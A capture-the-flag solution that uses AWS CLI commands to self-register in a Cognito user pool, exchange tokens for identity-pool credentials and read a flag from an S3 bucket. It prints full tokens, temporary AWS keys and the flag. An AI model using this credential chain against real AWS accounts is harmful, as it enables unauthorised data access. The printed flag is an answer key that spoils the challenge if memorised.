Install AWS CLI

```
curl "https://awscli.amazonaws.com/AWSCLIV2.pkg" -o "AWSCLIV2.pkg"
sudo installer -pkg AWSCLIV2.pkg -target /
```

```
aws cognito-idp sign-up \
  --client-id 4bjmgsip08ah118ugkau5p946b \
  --username test_user1 \
  --password YourPassword1! \
  --region us-east-1
```

```
aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id 4bjmgsip08ah118ugkau5p946b \
  --auth-parameters USERNAME=test_user1,PASSWORD=YourPassword1! \
  --region us-east-1
```

output

```
{
    "ChallengeParameters": {},
    "AuthenticationResult": {
        "AccessToken": "eyJraWQiOiJ2cnptNG40M1ljWUtFSFB4bFV2SFFqbXcxVzRjNU9QWENBTnBcL2FydGI1bz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJkNDY4ZTQ4OC01MDcxLTcwNjEtZWVmMi02ODk2ODJhYWQxY2MiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV91U2lkMTNaNkwiLCJjbGllbnRfaWQiOiI0YmptZ3NpcDA4YWgxMTh1Z2thdTVwOTQ2YiIsIm9yaWdpbl9qdGkiOiI1MTlhZDUyYS01ZDU3LTQ1ZmMtYWJmZS1kMTNmNmZjN2VlZjMiLCJldmVudF9pZCI6IjFlMTk0M2E3LWQ4YTctNGYwYS1hNzIzLTE0ZTdiMjI1ZTBhOSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3MjY5MjM3NTgsImV4cCI6MTcyNjkyNDA1OCwiaWF0IjoxNzI2OTIzNzU4LCJqdGkiOiIwZTY3YTQ4Zi1iYzFjLTRjNzMtODlhNi02NzVhMDZmYWNjM2UiLCJ1c2VybmFtZSI6InRlc3RfdXNlcjEifQ.bD3ny4RnfpcKEfBli1CoSqwXtBZKJQIF1870mzgT9djXCwhvhLM6gVERMorehH47-cVvDAXxzsjE2qmx1kIhIwUve3193IdBmddhEPE7Txel-ZfWgOIe6S2B52poQAlDdZ4S5z8nkCADFTGz9fh_wSA0vr9TgApXgXkO6W9lnR2I1auBxYRLfpcmnG970f-MWWUO9P2QJ_xNdiey5vPd17L61gy2zapgo8X_QPzf1Q9x1tz_1X-dhQjss617AGJvsQbR7QjKZrFf7-FkW4afk-pykrmoJUh-acH-8-AS2PqRZL5Cpj_m0uvUIO3SpfLCslpT0X6Fnl8-NdLwaCaFAw",
        "ExpiresIn": 300,
        "TokenType": "Bearer",
        "RefreshToken": "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.W_QJSRZIczgSwZf7907QbCrykJ57fKGUnA_7CbFO1zsei8ynouzSgBQlnRVD0YyE3saVTL7n0vNs7Dh1hKlPT1s75jUmUSpTq-tW7vuRX5BZzuiaNiHkf0NZvBiDVgm4RBQZ7cmadhIUheVvVmZCyatyfnmZlOs_FoutmA5FH8Mw6bHKWfY0zClAIUu4arNuEMqDDCdDV5NyP1TAfebJwvXJmG3ijZtHK5gFgEakukAtIFoAPWCYe_sbo1wNUG7CKrytwuVSGao5PcHQH0wSvrRa00vy8wgPpozzX95c9yS5e8gjap8iRbg9eB3CfRrFxlpPfNiHF1DfeNOR0VikOA.O3MrXeWKJZXs4i8m.wloCqFDPhd9ib_o15swqntH5mwWCbVG0dQFlXfwLjK2oWdN5lSJ8wr3eo_Hf05PWaX3_0k4vKoXtTLYznkkU5xpWOgKl9341KOlHQD0eKq8Zt7KL1q0ZNdxADuK7jgus7tiRiEuImXU9n5vgCks21j2gSCaS3lNCHyy4I3GlmPNz0X--cgaaPlavUr8LbBdyE63ippzJlC67-jLXnKb0gVVMUeolNxY9vZvm919g5i6p9vrEX0vR5dJ_4Iipm6HwAACezJDF_zLE8FcGQGCbJbbMYezq38SGr_Tg7eK8GHZbSdl1QEtOyhl_o-Lt2UzKPWbgniLbg-k8Bk7pVWfDQWREosxNEO3rSaq0c6MzbbAjico5E4APnTf63kbj2bXjiA6Ti5o5ohaqJVmQI-69Rg72fyadfSuNDhHIFr5Oh8Qymh4j-dvOxyO8g0Of8MxLyrsHjeFyqKaOJR8JvHSI_Sy4Ywq-lYTjbCS2gNR2vOmag1cLI-SXB5JQRswY4mFkkXGhYSu7Euy26y3PGlG0yyoSsGPGrJD2ZOCgDkZcjBVmk3c7wJCBiip1ydAFFLh-fL4eeIVh-YtHi3skdcIaO42qoNqorbAYwH_ob3sbrHK25_JdEMOKyHvwohFi2D1_Oq6bUb_oQZhdihWvDmEJqDrDRQP-LM-k5h51SASGzdmhr02OGWNKE3plywkIrM-YaBf4IOXosQk_ss2oUM5vG__K6UunG92Mj85arIeWjU9fMvRbYZVIZVc4lq4-5rSXQPwZRAon53BR0Y42vH1FBX-YY2ucuvcD7yA-Yw56E5gWpxiSwRpl-8G6cvtXPj_VPLEcmXiw1Mr8oRNoqAAYtnN_CJlPTJWVDjcmxm6p6kIUgQ5FExYuz8s5t3KN8kcdj9DL-HTXI7PRvCmzE6vqgBxdmKRGaN9dS3TJevaNpP5l2B9GBtKmpcpZhCckvaRIilC59vdPhwMSQd7cBzc7bW6EsF9nd4h1G7imxyFFKNOaCZcUqmbcD1XUkJBNCZyoViv7L7HMoUbvmcCbyU1XYi9PsefZxXA_KSkkOpgMAqv51MAtttlwJkSONLMvWq3BpkNZ8y39hdGAraWKDRBXkvYADhpaQ5MQXdkyVtQGTPar5eTZZZ-V8m9eHz-CyyV2ML-LpXE6e1LANHhxp56Dw78cOh6NfMHKF04vJYEpA240MqhVB1NHLiqJpzQxDfbosS1DHSqEF5_wPVW1FTx_DWhOr9MrXbqVMqMuXopNN4Ktc2QQJDSp1bV_hsBzowYyI9c4-_13AtLE0A.lgHhJmn3778NDw4fcHXMIw",
        "IdToken": "eyJraWQiOiIramJcL1ltbzdCZW40VTFFa2xmM01aRFRGUWxxQUJKK1hORjBtRlV5YVR3MD0iLCJhbGciOiJSUzI1NiJ9.eyJvcmlnaW5fanRpIjoiNTE5YWQ1MmEtNWQ1Ny00NWZjLWFiZmUtZDEzZjZmYzdlZWYzIiwic3ViIjoiZDQ2OGU0ODgtNTA3MS03MDYxLWVlZjItNjg5NjgyYWFkMWNjIiwiYXVkIjoiNGJqbWdzaXAwOGFoMTE4dWdrYXU1cDk0NmIiLCJldmVudF9pZCI6IjFlMTk0M2E3LWQ4YTctNGYwYS1hNzIzLTE0ZTdiMjI1ZTBhOSIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzI2OTIzNzU4LCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV91U2lkMTNaNkwiLCJjb2duaXRvOnVzZXJuYW1lIjoidGVzdF91c2VyMSIsImV4cCI6MTcyNjkyNDA1OCwiaWF0IjoxNzI2OTIzNzU4LCJqdGkiOiI4YTNmNGYzNi02ZGM0LTRjNmItYWUzYi1kYzg3MDk5ZTYwNmIifQ.PfxhrjxvJVul4ZmHcqTGTNVbPQCnhtuqJ0CNy3WXJ8V11X7QIDW3-zVCzasLli7pPvxN_HHr1WPNFfX3GQnVNWFAj9sAu3_FsUubr-iZnBf1lu_p_XH90G_x7TjxlNKrVoKAt9hYGSWSIHehlGwzgngxVWKlgBdzwJ1Ob57CneQB2T_FzJkSTvGh737OOzqY2exbuzYcEm6wcP0EZ6qSQkKcNfE7lC98CGTowZWid-EE4U75i-X97BNG9Z-tQGLkm1MGmlj9iL-EOf5lpTw7pumq-BVS6o3-BsZ-U-UmPRTmyFrHr0FwkFtHZwd9umdHqQaAwlGDCMcieJEX6201JA"
    }
}
```

Get Identity ID

```
ID_TOKEN='eyJraWQiOiIramJcL1ltbzdCZW40VTFFa2xmM01aRFRGUWxxQUJKK1hORjBtRlV5YVR3MD0iLCJhbGciOiJSUzI1NiJ9.eyJvcmlnaW5fanRpIjoiM2VmZmY4YTQtNGZkMy00YTBmLWI3MzYtNGYxNzI0NzNlZjc5Iiwic3ViIjoiZDQ2OGU0ODgtNTA3MS03MDYxLWVlZjItNjg5NjgyYWFkMWNjIiwiYXVkIjoiNGJqbWdzaXAwOGFoMTE4dWdrYXU1cDk0NmIiLCJldmVudF9pZCI6ImZlNzI0Y2MyLTQ2M2UtNDY0Zi04NTY0LWZiY2M3MGIwNmFhYiIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzI2OTI0NjE4LCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV91U2lkMTNaNkwiLCJjb2duaXRvOnVzZXJuYW1lIjoidGVzdF91c2VyMSIsImV4cCI6MTcyNjkyNDkxOCwiaWF0IjoxNzI2OTI0NjE4LCJqdGkiOiIyZWYwYjVkOC1lMmFhLTRkNGItOTQ2Ny00ZjA1Nzg3MWEzMDkifQ.KKWFDQAVXgfgvbWL-XoFmHK_DIs1yITEOo4Ggu3S5_C--Gs3274hPnbZqJ0tpiy1fk5ICKDbnoeUurUJsvkwDrrF0TM9QGgOV0UQrMiRFVVn7h5So2-oumcGGMzqANPEN0bmXyzHtJfHP5J-ZHcR4iqhQNhsfj64m3AQbutQY1jVSf8guTIqOfIbQROWNfkkwOdATBjYbi9Xl5iThnTQ7jXxdyOvNbDfR_KhOahLE5JtIo4MqwXHMMhWHCMVXW3NGbCSAIOSkl0CS5fx90pdHq2-yzLEM-elKZb5Xxxuy3hrKNGXcBbOR6WxIQkBR1NSOaaMsMs5Us4thA9LsttPLQ'
aws cognito-identity get-id \
  --identity-pool-id us-east-1:b73a3094-c689-47e2-b9c4-311d5b7ee1ee \
  --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=$ID_TOKEN" \
  --region us-east-1
```

Get output

```
{
    "IdentityId": "us-east-1:1b420a35-fef9-c0d0-e7bb-f67f023bed28"
}
```

```
IDENTITY_ID='1b420a35-fef9-c0d0-e7bb-f67f023bed28'
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:$IDENTITY_ID \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=$ID_TOKEN \
  --region us-east-1
```

get the output

```
{
    "IdentityId": "us-east-1:1b420a35-fef9-c0d0-e7bb-f67f023bed28",
    "Credentials": {
        "AccessKeyId": "ASIARWQQKGX7APB35NSZ",
        "SecretKey": "MmrdXNX+hxLsAhDnGoSguV7tmNo0q+7yqEUZXB3H",
        "SessionToken": "IQoJb3JpZ2luX2VjEFYaCXVzLWVhc3QtMSJIMEYCIQCpGp9+/ak+jiJMHyHLP1RQxAdBnQTu3J+GaUmKEcoiRQIhAMHfUWdzozw5gcxLDIEDFzPgZWA5c9lqPmHMeDNKujh6Ks0ECI7//////////wEQAhoMMTE3MDcyMDgyNDMwIgx5/ZKM/UgW3LwHJcUqoQS4n/e/8A+S/imtfEhgAegWkoHDQDjg8xOVZFoZwHANHzea1scFm6H9adP7/qzHb74vcd2mqao0Ws6rZ5ese/OQI3YWTh9cZ++8QEH4h1F8Xvdu/A+G1m65OvS4wX5oO/9cL55JJLps5RiOQnRqI5SycITS4aUMRTJ7+8xAeaz2AEkPVNx24IWJJ6H3o45et6v+PBXrsVJ0WESF6pYAiXA8caVs3eQMtcTL6Hy55pWT0wmF2lNRypEA26KOhpq523r/CqzxEJhZAXou8HY/y04uwzblgQl+ha49EtHYxsdGcE770YLII38M15wx/Vzb4egJa7U4qaspvW4xEWEebP3lk030eEhz2Ko4IraVmBZkNaZsb6Cia3SobCLC9V9WFd92UJfLESzu1o50QCPMCEJ7oLaL+VWucO398y00SrmTHPgciMsQ++CjTHY9Hh3Wf2apzOG2PmUsu+ToXs+rjUZcyPbkRgjwOd7oicJ6I+ZixECsMJzxsHZMA8dmbIDv4uPh/N15lSZ8XxpBkhPn8l4SIGvrdVPdlNQCMLxLHhZZlIromR0dOZ7K+f39xSfuXuO7JUaDZOQfCb1MMkLLIU3dwB3HUH4dtuLpI44OWhl4EJhO3gkjCgSH/ihzcYijkjpG5+QtRC+EugVw/Ivk9jdu9oSGAkbtZQTgvRAG7bPEsidU3EjYNAvgOpgAoengTBilT5ku9+kV7LPcgqB9NDomSjCnj7u3BjqEArfWVdJ0cMyL/THdFQ4ET0S6HOlQdv3lmlJEqSzyeOO86WDuIqm54b6HNQFEMOAlDndqyS8+qdgbtRYRD9zmaziWTco/fYVA1HPAf6B3MIna4MIU78KV7r+YfNWnnhU0dFKfaXPajxBd7rxPbqBZNZG9vbxFZzNJowMTAdZyJbUWTfGlgqt8RP2RrXpN2i2bUvTGo3bjmIrMkyb/Pf8Y4AEhZk1dt/uw305DjkuNth0SUd02uv3adeP9Y4La9tBLp0rFMftedOQxHCyxpjU6QsvMf7TnNUo7A6+yUA0+pBWEDMMvltVXhCdLaCq4wZN2Pj3aWcf4nimbk0KuexDw8Yw+Y6IE",
        "Expiration": "2024-09-21T15:18:31+01:00"
    }
}
```

```
aws configure set aws_access_key_id ASIARWQQKGX7APB35NSZ --profile temp
aws configure set aws_secret_access_key MmrdXNX+hxLsAhDnGoSguV7tmNo0q+7yqEUZXB3H --profile temp
aws configure set aws_session_token IQoJb3JpZ2luX2VjEFYaCXVzLWVhc3QtMSJIMEYCIQCpGp9+/ak+jiJMHyHLP1RQxAdBnQTu3J+GaUmKEcoiRQIhAMHfUWdzozw5gcxLDIEDFzPgZWA5c9lqPmHMeDNKujh6Ks0ECI7//////////wEQAhoMMTE3MDcyMDgyNDMwIgx5/ZKM/UgW3LwHJcUqoQS4n/e/8A+S/imtfEhgAegWkoHDQDjg8xOVZFoZwHANHzea1scFm6H9adP7/qzHb74vcd2mqao0Ws6rZ5ese/OQI3YWTh9cZ++8QEH4h1F8Xvdu/A+G1m65OvS4wX5oO/9cL55JJLps5RiOQnRqI5SycITS4aUMRTJ7+8xAeaz2AEkPVNx24IWJJ6H3o45et6v+PBXrsVJ0WESF6pYAiXA8caVs3eQMtcTL6Hy55pWT0wmF2lNRypEA26KOhpq523r/CqzxEJhZAXou8HY/y04uwzblgQl+ha49EtHYxsdGcE770YLII38M15wx/Vzb4egJa7U4qaspvW4xEWEebP3lk030eEhz2Ko4IraVmBZkNaZsb6Cia3SobCLC9V9WFd92UJfLESzu1o50QCPMCEJ7oLaL+VWucO398y00SrmTHPgciMsQ++CjTHY9Hh3Wf2apzOG2PmUsu+ToXs+rjUZcyPbkRgjwOd7oicJ6I+ZixECsMJzxsHZMA8dmbIDv4uPh/N15lSZ8XxpBkhPn8l4SIGvrdVPdlNQCMLxLHhZZlIromR0dOZ7K+f39xSfuXuO7JUaDZOQfCb1MMkLLIU3dwB3HUH4dtuLpI44OWhl4EJhO3gkjCgSH/ihzcYijkjpG5+QtRC+EugVw/Ivk9jdu9oSGAkbtZQTgvRAG7bPEsidU3EjYNAvgOpgAoengTBilT5ku9+kV7LPcgqB9NDomSjCnj7u3BjqEArfWVdJ0cMyL/THdFQ4ET0S6HOlQdv3lmlJEqSzyeOO86WDuIqm54b6HNQFEMOAlDndqyS8+qdgbtRYRD9zmaziWTco/fYVA1HPAf6B3MIna4MIU78KV7r+YfNWnnhU0dFKfaXPajxBd7rxPbqBZNZG9vbxFZzNJowMTAdZyJbUWTfGlgqt8RP2RrXpN2i2bUvTGo3bjmIrMkyb/Pf8Y4AEhZk1dt/uw305DjkuNth0SUd02uv3adeP9Y4La9tBLp0rFMftedOQxHCyxpjU6QsvMf7TnNUo7A6+yUA0+pBWEDMMvltVXhCdLaCq4wZN2Pj3aWcf4nimbk0KuexDw8Yw+Y6IE --profile temp
aws configure set region us-east-1 --profile temp
aws s3 cp s3://patriot-ctf-cloud-ctf-challenge/flag.txt - --profile temp
```

PCTF{G14d_th4T_y0u_tR13d!}